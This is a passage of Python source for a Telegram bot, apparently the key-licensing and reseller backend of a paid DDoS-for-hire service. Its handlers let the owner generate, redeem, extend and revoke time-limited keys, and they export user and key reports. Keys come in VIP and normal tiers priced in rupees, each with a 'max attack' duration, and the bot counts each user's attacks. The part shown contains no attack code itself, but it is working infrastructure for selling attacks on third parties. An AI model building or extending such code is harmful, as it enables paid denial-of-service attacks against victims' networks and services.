    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑫𝒐𝒏𝒆! 𝑬𝒗𝒆𝒓𝒚𝒐𝒏𝒆'𝒔 𝒕𝒊𝒎𝒆 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒆𝒙𝒕𝒆𝒏𝒅𝒆𝒅.</b>\n\n{HTML_EMOJI.PROFILE} 𝑻𝒐𝒕𝒂𝒍 𝑼𝒔𝒆𝒓𝒔: {extended_count}\n{HTML_EMOJI.DOCUMENT} 𝑵𝒐𝒕𝒊𝒇𝒊𝒆𝒅: {notified_count}\n{HTML_EMOJI.TIMER} 𝑨𝒅𝒅𝒆𝒅: {duration_label}", reply_to=message)

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /down &lt;id or @username&gt; &lt;time&gt;", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒅𝒖𝒓𝒂𝒕𝒊𝒐𝒏!</b>", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒊𝒏 𝒌𝒆𝒚 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆!</b>", reply_to=message)
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒅𝒐𝒆𝒔 𝒏𝒐𝒕 𝒉𝒂𝒗𝒆 𝒂𝒏 𝒂𝒄𝒕𝒊𝒗𝒆 𝒌𝒆𝒚!</b>", reply_to=message)
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝑲𝒆𝒚 𝑬𝒙𝒑𝒊𝒓𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {target_user_id}\n{HTML_EMOJI.CROSS} 𝑲𝒆𝒚 𝒓𝒆𝒎𝒐𝒗𝒆𝒅!", reply_to=message)
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑻𝒊𝒎𝒆 𝑹𝒆𝒅𝒖𝒄𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {target_user_id}\n{HTML_EMOJI.TIMER} 𝑹𝒆𝒅𝒖𝒄𝒆𝒅: {duration_label}\n{HTML_EMOJI.TIMER} 𝑵𝒆𝒘 𝑻𝒊𝒎𝒆: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /delkey &lt;key&gt;", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    result = keys_collection.delete_one({'key': key_input})
    
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑲𝒆𝒚 <code>{key_input}</code> 𝒅𝒆𝒍𝒆𝒕𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑲𝒆𝒚 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /key &lt;key&gt;", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑲𝒆𝒚 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.KEY} 𝑲𝑬𝒀 𝑫𝑬𝑻𝑨𝑰𝑳𝑺\n"
    response += "═══════════════════════════\n\n"
    
    response += f"{HTML_EMOJI.KEY} 𝑲𝒆𝒚: {key_input}\n"
    response += f"{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"{HTML_EMOJI.TIMER} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔: {key_doc.get('duration_seconds', 0)}\n"
    response += f"{HTML_EMOJI.CALENDAR} 𝑪𝒓𝒆𝒂𝒕𝒆𝒅: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"{HTML_EMOJI.PROFILE} 𝑪𝒓𝒆𝒂𝒕𝒐𝒓: {creator} (𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓)\n"
    else:
        response += f"{HTML_EMOJI.PROFILE} 𝑪𝒓𝒆𝒂𝒕𝒐𝒓: 𝑶𝑾𝑵𝑬𝑹\n"
    
    response += f"\n{HTML_EMOJI.STATS} 𝑺𝒕𝒂𝒕𝒖𝒔: {'🔴 𝑼𝑺𝑬𝑫' if key_doc.get('used') else '🟢 𝑼𝑵𝑼𝑺𝑬𝑫'}\n"
    response += f"{HTML_EMOJI.STAR} 𝑻𝒚𝒑𝒆: {key_doc.get('key_type', 'NORMAL')}\n"
    response += f"{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {key_doc.get('max_attack_time', 300)}s\n"
    
    if key_doc.get('used'):
        response += f"{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒅 𝑩𝒚: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"{HTML_EMOJI.CALENDAR} 𝑼𝒔𝒆𝒅 𝑨𝒕: {key_doc.get('used_at', 'Unknown')}\n"
        
        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n─── 𝑼𝑺𝑬𝑹 𝑰𝑵𝑭𝑶 ───\n"
            response += f"{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: {user.get('username', 'Unknown')}\n"
            response += f"{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓 𝑰𝑫: {user.get('user_id', 'Unknown')}\n"
            
            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"{HTML_EMOJI.TIMER} 𝑹𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈: {remaining}\n"
                    response += f"{HTML_EMOJI.CHECKMARK} 𝑺𝒕𝒂𝒕𝒖𝒔: 𝑨𝑪𝑻𝑰𝑽𝑬\n"
                else:
                    response += f"{HTML_EMOJI.CROSS} 𝑺𝒕𝒂𝒕𝒖𝒔: 𝑬𝑿𝑷𝑰𝑹𝑬𝑫\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))
    
    content = "═══════════════════════════\n"
    content += "       𝑨𝑳𝑳 𝑲𝑬𝒀𝑺 𝑹𝑬𝑷𝑶𝑹𝑻\n"
    content += f"    𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"𝑼𝑵𝑼𝑺𝑬𝑫 𝑲𝑬𝒀𝑺 ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {key.get('duration_label', 'N/A')}\n"
        content += f"   𝑻𝒚𝒑𝒆: {key.get('key_type', 'NORMAL')}\n"
        content += f"   𝑪𝒓𝒆𝒂𝒕𝒆𝒅: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   𝑩𝒚: {key.get('created_by_username')}\n"
        content += "\n"
    
    if not unused_keys:
        content += "   𝑵𝒐 𝒖𝒏𝒖𝒔𝒆𝒅 𝒌𝒆𝒚𝒔\n\n"
    
    content += f"\n𝑼𝑺𝑬𝑫 𝑲𝑬𝒀𝑺 ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {key.get('duration_label', 'N/A')}\n"
        content += f"   𝑻𝒚𝒑𝒆: {key.get('key_type', 'NORMAL')}\n"
        content += f"   𝑼𝒔𝒆𝒅 𝒃𝒚: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   𝑼𝒔𝒆𝒅 𝒂𝒕: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   𝑪𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚: {key.get('created_by_username')}\n"
        content += "\n"
    
    if not used_keys:
        content += "   𝑵𝒐 𝒖𝒔𝒆𝒅 𝒌𝒆𝒚𝒔\n"
    
    content += "\n═══════════════════════════\n"
    content += f"𝑻𝑶𝑻𝑨𝑳: {len(unused_keys)} 𝒖𝒏𝒖𝒔𝒆𝒅 | {len(used_keys)} 𝒖𝒔𝒆𝒅\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    if bot:
        bot.send_document(message.chat.id, file, caption=f"{HTML_EMOJI.DOCUMENT} 𝑨𝒍𝒍 𝑲𝒆𝒚𝒔 𝑹𝒆𝒑𝒐𝒓𝒕\n\n{HTML_EMOJI.CHECKMARK} 𝑼𝒏𝒖𝒔𝒆𝒅: {len(unused_keys)}\n{HTML_EMOJI.CROSS} 𝑼𝒔𝒆𝒅: {len(used_keys)}", parse_mode="HTML")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    
    if not all_users:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒖𝒔𝒆𝒓𝒔 𝒇𝒐𝒖𝒏𝒅!", reply_to=message)
        return
    
    active_users = []
    expired_users = []
    
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    content = "═══════════════════════════\n"
    content += "       𝑨𝑳𝑳 𝑼𝑺𝑬𝑹𝑺 𝑹𝑬𝑷𝑶𝑹𝑻\n"
    content += f"    𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"𝑨𝑪𝑻𝑰𝑽𝑬 𝑼𝑺𝑬𝑹𝑺 ({len(active_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(active_users, 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   𝑰𝑫: {user['user_id']}\n"
        content += f"   𝑲𝒆𝒚: {user.get('key', 'N/A')}\n"
        content += f"   𝑻𝒚𝒑𝒆: {key_type}\n"
        content += f"   𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   𝑻𝒊𝒎𝒆 𝑳𝒆𝒇𝒕: {time_str}\n"
        content += f"   𝑬𝒙𝒑𝒊𝒓𝒆𝒔: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   𝑻𝒐𝒕𝒂𝒍 𝑨𝒕𝒕𝒂𝒄𝒌𝒔: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓: @{user['reseller_username']}\n"
        content += "\n"
    
    if not active_users:
        content += "   𝑵𝒐 𝒂𝒄𝒕𝒊𝒗𝒆 𝒖𝒔𝒆𝒓𝒔\n\n"
    
    content += f"\n𝑬𝑿𝑷𝑰𝑹𝑬𝑫 𝑼𝑺𝑬𝑹𝑺 ({len(expired_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(expired_users, 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   𝑰𝑫: {user['user_id']}\n"
        content += f"   𝑲𝒆𝒚: {user.get('key', 'N/A')}\n"
        content += f"   𝑻𝒚𝒑𝒆: {key_type}\n"
        if user.get('key_expiry'):
            content += f"   𝑬𝒙𝒑𝒊𝒓𝒆𝒅: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   𝑻𝒐𝒕𝒂𝒍 𝑨𝒕𝒕𝒂𝒄𝒌𝒔: {attack_count}\n"
        content += "\n"
    
    if not expired_users:
        content += "   𝑵𝒐 𝒆𝒙𝒑𝒊𝒓𝒆𝒅 𝒖𝒔𝒆𝒓𝒔\n"
    
    content += "\n═══════════════════════════\n"
    content += f"𝑻𝑶𝑻𝑨𝑳: {len(active_users)} 𝑨𝒄𝒕𝒊𝒗𝒆 | {len(expired_users)} 𝑬𝒙𝒑𝒊𝒓𝒆𝒅\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    if bot:
        bot.send_document(message.chat.id, file, caption=f"{HTML_EMOJI.USERS} 𝑨𝒍𝒍 𝑼𝒔𝒆𝒓𝒔 𝑹𝒆𝒑𝒐𝒓𝒕\n\n{HTML_EMOJI.CHECKMARK} 𝑨𝒄𝒕𝒊𝒗𝒆: {len(active_users)}\n{HTML_EMOJI.CROSS} 𝑬𝒙𝒑𝒊𝒓𝒆𝒅: {len(expired_users)}", parse_mode="HTML")

@bot.message_handler(commands=["delexpkey"])
def del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []
    
    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)
    
    if not expired_keys:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑵𝒐 𝒆𝒙𝒑𝒊𝒓𝒆𝒅 𝒌𝒆𝒚𝒔 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    pending_del_exp_key[user_id] = expired_keys
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝑭𝒐𝒖𝒏𝒅 {len(expired_keys)} 𝒆𝒙𝒑𝒊𝒓𝒆𝒅 𝒌𝒆𝒚𝒔!</b>\n\n𝑻𝒚𝒑𝒆 /confirm_delexpkey 𝒕𝒐 𝒄𝒐𝒏𝒇𝒊𝒓𝒎.\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒄𝒂𝒏𝒄𝒆𝒍.", reply_to=message)

@bot.message_handler(commands=["confirm_delexpkey"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑭𝒊𝒓𝒔𝒕 𝒖𝒔𝒆 /delexpkey!</b>", reply_to=message)
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
        except:
            pass
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>{deleted_count} 𝒆𝒙𝒑𝒊𝒓𝒆𝒅 𝒌𝒆𝒚𝒔 𝒅𝒆𝒍𝒆𝒕𝒆𝒅!</b>", reply_to=message)

@bot.message_handler(commands=["trail"])
def trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /trail &lt;hours&gt; &lt;max_users&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /trail 1 10 (1 𝒉𝒐𝒖𝒓 𝒌𝒆𝒚 𝒇𝒐𝒓 10 𝒖𝒔𝒆𝒓𝒔)", reply_to=message)
        return
    
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒉𝒐𝒖𝒓𝒔 𝒐𝒓 𝒎𝒂𝒙_𝒖𝒔𝒆𝒓𝒔!</b>", reply_to=message)
        return
    
    key = f"TRAIL-{generate_key(8)}"
    
    key_doc = {
        'key': key,
        'duration_seconds': hours * 3600,
        'duration_label': f"{hours} hours (Trail)",
        'created_at': datetime.now(),
        'created_by': user_id,
        'created_by_type': 'owner',
        'used': False,
        'used_by': None,
        'used_at': None,
        'max_users': max_users,
        'current_users': 0,
        'is_trail': True,
        'key_type': 'NORMAL',
        'max_attack_time': 300
    }
    
    keys_collection.insert_one(key_doc)
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑻𝒓𝒂𝒊𝒍 𝑲𝒆𝒚 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚: <code>{key}</code>\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {hours} 𝒉𝒐𝒖𝒓𝒔\n{HTML_EMOJI.USERS} 𝑴𝒂𝒙 𝑼𝒔𝒆𝒓𝒔: {max_users}", reply_to=message)
    
# ============ PRICES COMMAND ============

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒊𝒔 𝒇𝒐𝒓 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓𝒔 𝒐𝒏𝒍𝒚!</b>", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.CREDIT} 𝑲𝑬𝒀 𝑷𝑹𝑰𝑪𝑰𝑵𝑮\n"
    response += "═══════════════════════════\n\n"
    
    response += f"{HTML_EMOJI.STAR} 𝑽𝑰𝑷 𝑲𝑬𝒀𝑺:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('VIP', dur)
        response += f"   {label:<12} ➜  {price} 𝑹𝒔\n"
    
    response += f"\n{HTML_EMOJI.DOCUMENT} 𝑵𝑶𝑹𝑴𝑨𝑳 𝑲𝑬𝒀𝑺:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('NORMAL', dur)
        response += f"   {label:<12} ➜  {price} 𝑹𝒔\n"
    
    response += "\n═══════════════════════════\n"
    response += f"{HTML_EMOJI.STAR} 𝑽𝑰𝑷 𝑴𝑨𝑿 𝑨𝑻𝑻𝑨𝑪𝑲: {get_key_max_attack('VIP')}s\n"
    response += f"{HTML_EMOJI.DOCUMENT} 𝑵𝑶𝑹𝑴𝑨𝑳 𝑴𝑨𝑿 𝑨𝑻𝑻𝑨𝑪𝑲: {get_key_max_attack('NORMAL')}s\n"
    response += "═══════════════════════════\n"
    response += f"{HTML_EMOJI.DOCUMENT} 𝑼𝒔𝒂𝒈𝒆: /gen (𝒕𝒉𝒆𝒏 𝒄𝒉𝒐𝒐𝒔𝒆 𝒌𝒆𝒚 𝒕𝒚𝒑𝒆)\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ REDEEM COMMAND ============

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /redeem &lt;key&gt;", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒌𝒆𝒚!</b>", reply_to=message)
        return
    
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc['used'] and current_users >= max_users:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒌𝒆𝒚 𝒉𝒂𝒔 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒃𝒆𝒆𝒏 𝒖𝒔𝒆𝒅!</b>", reply_to=message)
        return
    
    if key_doc.get('is_trail'):
        user_data = users_collection.find_one({'user_id': user_id})
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
            
            if abuse_count == 1:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝑾𝒂𝒓𝒏𝒊𝒏𝒈: 𝒀𝒐𝒖 𝒄𝒂𝒏𝒏𝒐𝒕 𝒆𝒙𝒕𝒆𝒏𝒅 𝒚𝒐𝒖𝒓 𝒕𝒊𝒎𝒆 𝒘𝒊𝒕𝒉 𝒂 𝒕𝒓𝒂𝒊𝒍 𝒌𝒆𝒚!</b> 𝑨𝒏𝒐𝒕𝒉𝒆𝒓 𝒂𝒕𝒕𝒆𝒎𝒑𝒕 𝒎𝒂𝒚 𝒓𝒆𝒔𝒖𝒍𝒕 𝒊𝒏 𝒂 𝒃𝒂𝒏.", reply_to=message)
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2))
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}
                )
                safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒃𝒂𝒏𝒏𝒆𝒅 𝒇𝒐𝒓 {ban_minutes} 𝒎𝒊𝒏𝒖𝒕𝒆𝒔 𝒅𝒖𝒆 𝒕𝒐 𝒕𝒓𝒂𝒊𝒍 𝒌𝒆𝒚 𝒂𝒃𝒖𝒔𝒆!</b>", reply_to=message)
            return

    user = users_collection.find_one({'user_id': user_id})
    
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    key_type = key_doc.get('key_type', 'NORMAL')
    max_attack_time = key_doc.get('max_attack_time', get_key_max_attack(key_type))
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }}
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        new_remaining = get_time_remaining(user_id)
